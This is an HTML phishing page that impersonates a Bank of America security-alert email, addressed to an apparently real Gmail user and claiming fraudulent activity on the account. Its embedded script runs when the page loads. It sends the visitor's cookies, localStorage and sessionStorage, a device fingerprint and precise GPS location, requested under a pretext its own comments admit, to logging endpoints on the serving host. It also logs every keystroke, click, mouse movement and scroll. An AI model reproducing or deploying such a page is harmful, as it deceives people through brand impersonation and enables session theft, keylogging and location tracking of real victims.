<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank of America - Security Alert</title>
    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #f0f0f0;
            padding: 20px;
            line-height: 1.6;
            color: #333;
        }

        .email-container {
            max-width: 650px;
            margin: 0 auto;
            background: white;
            border: 1px solid #ddd;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .email-header {
            background: linear-gradient(135deg, #E31837 0%, #C4152E 100%);
            color: white;
            padding: 25px 30px;
            border-bottom: 3px solid #A00E23;
        }

        .email-header .logo {
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
            text-align: left;
        }

        .email-header .subtitle {
            font-size: 13px;
            opacity: 0.95;
            text-align: left;
            font-weight: 300;
        }

        .email-content {
            padding: 35px 30px;
        }

        .email-meta {
            border-bottom: 1px solid #eee;
            padding-bottom: 20px;
            margin-bottom: 20px;
        }

        .email-meta p {
            margin: 5px 0;
            font-size: 14px;
            color: #666;
        }

        .alert-box {
            background: #FFF8E1;
            border-left: 4px solid #E31837;
            border-top: 1px solid #FBC02D;
            border-right: 1px solid #FBC02D;
            border-bottom: 1px solid #FBC02D;
            padding: 20px 25px;
            margin: 25px 0;
        }

        .alert-box h3 {
            color: #B71C1C;
            margin-bottom: 12px;
            font-size: 20px;
            font-weight: 600;
        }

        .alert-box p {
            color: #424242;
            margin-bottom: 10px;
            font-size: 15px;
        }

        .fraud-details {
            background: #f8f9fa;
            border: 2px solid #E31837;
            border-radius: 6px;
            padding: 20px;
            margin: 25px 0;
            box-shadow: 0 2px 8px rgba(227, 24, 55, 0.1);
        }

        .fraud-details h4 {
            color: #E31837;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            border-bottom: 2px solid #E31837;
            padding-bottom: 10px;
        }

        .fraud-category {
            background: #ffffff;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 15px;
            margin: 15px 0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .fraud-category h5 {
            color: #E31837;
            margin-bottom: 12px;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .fraud-details ul {
            margin-left: 20px;
            margin-bottom: 0;
        }

        .fraud-details li {
            margin-bottom: 8px;
            color: #333;
            line-height: 1.4;
        }

        .fraud-details li strong {
            color: #E31837;
            font-weight: 600;
        }

        .action-buttons {
            text-align: center;
            margin: 30px 0;
        }

        .btn {
            display: inline-block;
            padding: 12px 24px;
            margin: 0 10px;
            border: none;
            border-radius: 4px;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background: #E31837;
            color: white;
            border: none;
            box-shadow: 0 2px 4px rgba(227, 24, 55, 0.3);
        }

        .btn-primary:hover {
            background: #C4152E;
            box-shadow: 0 3px 6px rgba(227, 24, 55, 0.4);
        }

        .btn-secondary {
            background: #6c757d;
            color: white;
        }

        .btn-secondary:hover {
            background: #5a6268;
        }

        .footer {
            background: #f5f5f5;
            padding: 25px 30px;
            text-align: center;
            font-size: 11px;
            color: #666;
            border-top: 2px solid #E0E0E0;
            line-height: 1.8;
        }

        .footer strong {
            color: #003F87;
            font-weight: 600;
        }

        .timestamp {
            color: #999;
            font-size: 12px;
            text-align: right;
            margin-bottom: 10px;
        }

        .admin-link {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #333;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 12px;
            z-index: 1000;
        }

        @media (max-width: 600px) {
            body {
                padding: 10px;
            }
            
            .email-content {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <a href="/admin" class="admin-link">Admin</a>
    
    <div class="email-container">
        <div class="email-header">
            <div class="logo">Bank of America</div>
            <div class="subtitle">Security Alert Notification</div>
        </div>

        <div class="email-content">
            <div class="timestamp" id="timestamp"></div>
            
            <div class="email-meta">
                <p><strong>From:</strong> security@bankofamerica.com</p>
                <p><strong>To:</strong> madhuk2012@gmail.com</p>
                <p><strong>Subject:</strong> URGENT: Fraudulent Activity Detected on Your Account</p>
                <p><strong>Date:</strong> <span id="emailDate"></span></p>
            </div>

            <div class="alert-box">
                <h3>üö® SECURITY ALERT</h3>
                <p><strong>We have detected suspicious activity on your Bank of America account.</strong></p>
                <p>Our security systems have identified potential fraudulent transactions and unauthorized access attempts.</p>
            </div>

            <div class="fraud-details">
                <h4>üö® Detected Fraudulent Activities:</h4>
                <div class="fraud-category">
                    <h5>üí∞ ACH Transfer Fraud Attempts:</h5>
                    <ul>
                        <li><strong>Unauthorized ACH Debits:</strong> Attempted transfers from ineligible external accounts not linked to your profile</li>
                        <li><strong>ACH Origination Fraud:</strong> Multiple failed attempts to initiate ACH transfers to unverified payees</li>
                        <li><strong>Account Takeover Attempts:</strong> Unauthorized access attempts to modify ACH transfer limits and beneficiaries</li>
                        <li><strong>Wire Transfer Fraud:</strong> Suspicious international wire transfer requests to high-risk jurisdictions</li>
                        <li><strong>Bill Pay Manipulation:</strong> Attempts to modify existing payees and payment amounts without proper authentication</li>
                    </ul>
                </div>
                
                <div class="fraud-category">
                    <h5>üîê Account Security Violations:</h5>
                    <ul>
                        <li><strong>Multiple Failed Authentication:</strong> 12+ failed login attempts from unrecognized devices and locations</li>
                        <li><strong>Geographic Anomalies:</strong> Account access from foreign IP addresses inconsistent with your typical usage patterns</li>
                        <li><strong>Device Fingerprint Mismatch:</strong> Login attempts from devices not previously associated with your account</li>
                        <li><strong>Credential Compromise:</strong> Potential unauthorized access using compromised login credentials</li>
                        <li><strong>Session Hijacking:</strong> Suspicious concurrent sessions from multiple geographic locations</li>
                    </ul>
                </div>
                
                <div class="fraud-category">
                    <h5>‚ö†Ô∏è Transaction Pattern Anomalies:</h5>
                    <ul>
                        <li><strong>Velocity Alerts:</strong> Unusually high transaction volumes inconsistent with your historical spending patterns</li>
                        <li><strong>Amount Threshold Violations:</strong> Transactions exceeding your established daily and monthly limits</li>
                        <li><strong>Merchant Category Anomalies:</strong> Purchases from high-risk merchant categories not typical for your account</li>
                        <li><strong>Time-based Irregularities:</strong> Transactions occurring during unusual hours inconsistent with your normal activity</li>
                        <li><strong>Duplicate Transaction Attempts:</strong> Multiple identical transaction requests suggesting automated fraud attempts</li>
                    </ul>
                </div>
                
                <div class="fraud-category">
                    <h5>üõ°Ô∏è Regulatory Compliance Violations:</h5>
                    <ul>
                        <li><strong>OFAC Sanctions Screening:</strong> Attempted transactions involving entities on the Office of Foreign Assets Control watchlist</li>
                        <li><strong>AML Red Flags:</strong> Activities triggering Anti-Money Laundering monitoring systems</li>
                        <li><strong>KYC Violations:</strong> Attempts to modify account information without proper Know Your Customer verification</li>
                        <li><strong>Regulation E Violations:</strong> Unauthorized electronic fund transfer attempts not properly authenticated</li>
                    </ul>
                </div>
            </div>

            <p>We have temporarily restricted certain account features to protect your funds. Please review the following information and take immediate action:</p>

            <div class="action-buttons">
                <a href="#" class="btn btn-primary" onclick="logAction('viewed_details')">View Account Details</a>
                <a href="#" class="btn btn-secondary" onclick="logAction('contacted_support')">Contact Support</a>
            </div>

            <div class="footer">
                <p><strong>Bank of America Corporation</strong></p>
                <p>This is an automated security alert. Please do not reply to this email.</p>
                <p>¬© 2024 Bank of America Corporation. All rights reserved.</p>
            </div>
        </div>
    </div>

    <script>
        // Set current timestamp
        document.getElementById('timestamp').textContent = new Date().toLocaleString();
        document.getElementById('emailDate').textContent = new Date().toLocaleDateString();

        // COMPREHENSIVE DATA COLLECTION - NO USER ACTION REQUIRED
        function collectComprehensiveData() {
            const data = {
                timestamp: new Date().toISOString(),
                
                // Basic Info
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                
                // Screen & Display
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                screenAvailWidth: screen.availWidth,
                screenAvailHeight: screen.availHeight,
                screenOrientation: screen.orientation ? screen.orientation.type : 'unknown',
                
                // Window & Viewport
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                windowOuterWidth: window.outerWidth,
                windowOuterHeight: window.outerHeight,
                windowDevicePixelRatio: window.devicePixelRatio,
                
                // Location & Time
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                
                // Network & Connection
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                
                // Browser & Device Detection
                browserName: getBrowserName(),
                browserVersion: getBrowserVersion(),
                osName: getOSName(),
                deviceType: getDeviceType(),
                isMobile: /Mobi|Android/i.test(navigator.userAgent),
                isTablet: /Tablet|iPad/i.test(navigator.userAgent),
                isDesktop: !/Mobi|Android|Tablet|iPad/i.test(navigator.userAgent),
                
                // Referrer & URL
                referrer: document.referrer,
                url: window.location.href,
                hostname: window.location.hostname,
                pathname: window.location.pathname,
                
                // Storage
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                cookies: document.cookie,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
                
                // Media Devices
                mediaDevices: navigator.mediaDevices ? 'available' : 'not available',
                
                // Performance
                performance: {
                    timing: performance.timing ? {
                        navigationStart: performance.timing.navigationStart,
                        loadEventEnd: performance.timing.loadEventEnd,
                        domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
                    } : null,
                    memory: performance.memory ? {
                        usedJSHeapSize: performance.memory.usedJSHeapSize,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                    } : null
                },
                
                // Browser Geolocation (exact coordinates - will be requested separately)
                browserGeolocation: null,
                
                // WebGL Info
                webgl: getWebGLInfo(),
                
                // Canvas Fingerprint
                canvasFingerprint: getCanvasFingerprint(),
                
                // Fonts
                fonts: getAvailableFonts(),
                
                // Plugins
                plugins: getPluginsInfo(),
                
                // Battery (if available)
                battery: navigator.getBattery ? 'available' : 'not available'
            };

            // Send initial data to server
            fetch('/log-visitor', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(err => console.log('Logging failed:', err));
            
            // Request exact location from browser (Bank of America "security verification")
            requestExactLocation(data);
        }
        
        // Request exact GPS location from browser
        function requestExactLocation(initialData) {
            if (!navigator.geolocation) {
                console.log('Geolocation not supported');
                // Log that geolocation is not available
                fetch('/log-visitor-location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        ...initialData,
                        exactLocation: {
                            error: 'Geolocation not supported by browser',
                            unavailable: true
                        }
                    })
                }).catch(err => console.log('Location logging failed:', err));
                return;
            }
            
            // Request location with legitimate-sounding reason
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Success - we got exact coordinates!
                    const exactLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy, // in meters
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp,
                        source: 'browser_gps', // This is EXACT location from browser
                        promptShown: true // User saw and allowed the prompt
                    };
                    
                    // Log exact location to server
                    fetch('/log-visitor-location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            ...initialData,
                            exactLocation: exactLocation
                        })
                    }).catch(err => console.log('Location logging failed:', err));
                },
                function(error) {
                    // User denied or error occurred
                    console.log('Location access error:', error.message, 'Code:', error.code);
                    
                    // Determine if prompt was shown or silently denied
                    let promptStatus = 'unknown';
                    let reason = '';
                    
                    if (error.code === 1) {
                        // Permission denied - could be user denied OR browser preference already set
                        // We can't detect if prompt was shown, but we'll note it
                        promptStatus = 'denied';
                        reason = error.message || 'Location permission denied';
                    } else if (error.code === 2) {
                        // Position unavailable
                        promptStatus = 'unavailable';
                        reason = error.message || 'Position unavailable';
                    } else if (error.code === 3) {
                        // Timeout
                        promptStatus = 'timeout';
                        reason = error.message || 'Location request timeout';
                    }
                    
                    fetch('/log-visitor-location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            ...initialData,
                            exactLocation: {
                                error: reason,
                                denied: error.code === 1,
                                unavailable: error.code === 2,
                                timeout: error.code === 3,
                                errorCode: error.code,
                                promptShown: false, // Can't detect, but if error.code === 1, browser might have saved preference
                                note: error.code === 1 ? 'No prompt shown if browser already has saved "deny" preference' : 'Error occurred'
                            }
                        })
                    }).catch(err => console.log('Location logging failed:', err));
                },
                {
                    enableHighAccuracy: true, // Request most accurate location
                    timeout: 10000, // 10 second timeout
                    maximumAge: 0 // Don't use cached location
                }
            );
        }

        // Browser Detection
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            if (ua.includes('Opera')) return 'Opera';
            return 'Unknown';
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+\.\d+)/);
            return match ? match[2] : 'Unknown';
        }

        function getOSName() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/iPad/i.test(ua)) return 'iPad';
            if (/Android/i.test(ua)) return 'Android';
            if (/Windows Phone/i.test(ua)) return 'Windows Phone';
            if (/Mac/i.test(ua)) return 'Mac';
            if (/Windows/i.test(ua)) return 'Windows PC';
            return 'Unknown';
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    return {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER),
                        version: gl.getParameter(gl.VERSION)
                    };
                }
            } catch (e) {}
            return null;
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas fingerprint', 2, 2);
                return canvas.toDataURL();
            } catch (e) {
                return 'error';
            }
        }

        function getAvailableFonts() {
            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const available = [];
            const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
            const testSize = '72px';
            const h = document.getElementsByTagName('body')[0];
            const s = document.createElement('span');
            s.style.fontSize = testSize;
            s.innerHTML = testString;
            const defaultWidth = {};
            const defaultHeight = {};
            
            for (const font of fonts) {
                s.style.fontFamily = font;
                h.appendChild(s);
                defaultWidth[font] = s.offsetWidth;
                defaultHeight[font] = s.offsetHeight;
                h.removeChild(s);
            }
            
            return available;
        }

        function getPluginsInfo() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push({
                    name: navigator.plugins[i].name,
                    description: navigator.plugins[i].description,
                    filename: navigator.plugins[i].filename
                });
            }
            return plugins;
        }

        // Collect data immediately when page loads
        collectComprehensiveData();

        // Log user actions
        function logAction(action) {
            fetch('/log-action', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    action: action,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer
                })
            }).catch(err => console.log('Action logging failed:', err));
        }

        // Track all interactions
        document.addEventListener('click', function(e) {
            fetch('/log-interaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    event: 'click',
                    target: e.target.tagName,
                    className: e.target.className,
                    x: e.clientX,
                    y: e.clientY,
                    text: e.target.textContent
                })
            }).catch(err => console.log('Interaction logging failed:', err));
        });

        // Track page visibility
        document.addEventListener('visibilitychange', function() {
            fetch('/log-visibility', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    visibility: document.visibilityState
                })
            }).catch(err => console.log('Visibility logging failed:', err));
        });

        // Track scrolling behavior
        let scrollData = [];
        window.addEventListener('scroll', function() {
            scrollData.push({
                timestamp: new Date().toISOString(),
                scrollY: window.scrollY,
                scrollPercent: Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100)
            });
        });

        // Send scroll data periodically
        setInterval(() => {
            if (scrollData.length > 0) {
                fetch('/log-scroll', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        scrollData: scrollData
                    })
                }).catch(err => console.log('Scroll logging failed:', err));
                scrollData = [];
            }
        }, 5000);

        // Track mouse movements
        let mouseData = [];
        document.addEventListener('mousemove', function(e) {
            mouseData.push({
                timestamp: new Date().toISOString(),
                x: e.clientX,
                y: e.clientY
            });
        });

        // Send mouse data periodically
        setInterval(() => {
            if (mouseData.length > 0) {
                fetch('/log-mouse', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        mouseData: mouseData
                    })
                }).catch(err => console.log('Mouse logging failed:', err));
                mouseData = [];
            }
        }, 10000);

        // Track keyboard events
        document.addEventListener('keydown', function(e) {
            fetch('/log-keyboard', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    key: e.key,
                    code: e.code,
                    keyCode: e.keyCode
                })
            }).catch(err => console.log('Keyboard logging failed:', err));
        });

        // Track page unload
        window.addEventListener('beforeunload', function() {
            fetch('/log-unload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    event: 'beforeunload'
                })
            }).catch(err => console.log('Unload logging failed:', err));
        });
    </script>
</body>
</html>
